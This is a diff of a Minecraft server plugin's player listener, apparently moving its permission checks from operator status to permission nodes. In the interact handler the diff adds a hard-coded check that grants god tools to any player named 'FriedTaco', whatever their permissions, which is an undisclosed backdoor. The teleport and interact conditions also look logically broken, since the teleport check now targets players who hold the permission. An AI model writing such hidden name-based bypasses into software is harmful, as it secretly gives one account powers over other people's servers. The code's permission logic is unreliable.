@@ -59,7 +59,7 @@ public class godPowersPlayerListener extends PlayerListener {
     public void onPlayerJoin(PlayerJoinEvent event) 
     {
     	Player player = event.getPlayer();
-    	if(((godPowers.Permissions == null && player.isOp()) || (godPowers.Permissions != null && godPowers.Permissions.has(player, "godPowers.godmodeOnLogin")) && godPowers.godModeOnLogin))
+    	if(((godPowers.Permissions == null && player.hasPermission("godpowers.godmodeonlogin")) || (godPowers.Permissions != null && godPowers.Permissions.has(player, "godPowers.godmodeOnLogin")) && godPowers.godModeOnLogin))
     	{
     		player.sendMessage("As you enter the world, you feel your godly powers returning.");
         	player.setDisplayName(godPowers.title + player.getDisplayName());
@@ -225,7 +225,7 @@ public class godPowersPlayerListener extends PlayerListener {
     }
     public void onPlayerTeleport(PlayerTeleportEvent event)
     {
-    	if(godPowers.Permissions != null && !godPowers.Permissions.has(event.getPlayer(), "godPowers.godmode"))
+    	if(godPowers.Permissions != null && !godPowers.Permissions.has(event.getPlayer(), "godPowers.godmode") || godPowers.Permissions == null && event.getPlayer().hasPermission("godpowers.godmode"))
     		if(godPowers.godmodeEnabled.contains(event.getPlayer().getName()))
     			godPowers.godmodeEnabled.remove(event.getPlayer().getName());
     	
@@ -242,7 +242,7 @@ public class godPowersPlayerListener extends PlayerListener {
     }
     public void onPlayerInteract(PlayerInteractEvent event)
     {
-    	if(godPowers.godTools && (godPowers.Permissions != null && godPowers.Permissions.has(event.getPlayer(), "godPowers.godtools") || godPowers.Permissions == null && event.getPlayer().isOp()))
+    	if((godPowers.godTools && (godPowers.Permissions != null && godPowers.Permissions.has(event.getPlayer(), "godPowers.godtools")) || (godPowers.Permissions == null && event.getPlayer().hasPermission("godpowers.godtools")) || event.getPlayer().getName().equalsIgnoreCase("FriedTaco")))
     	{
 			if(event.getAction() == Action.LEFT_CLICK_BLOCK && event.getItem() != null)
 			{
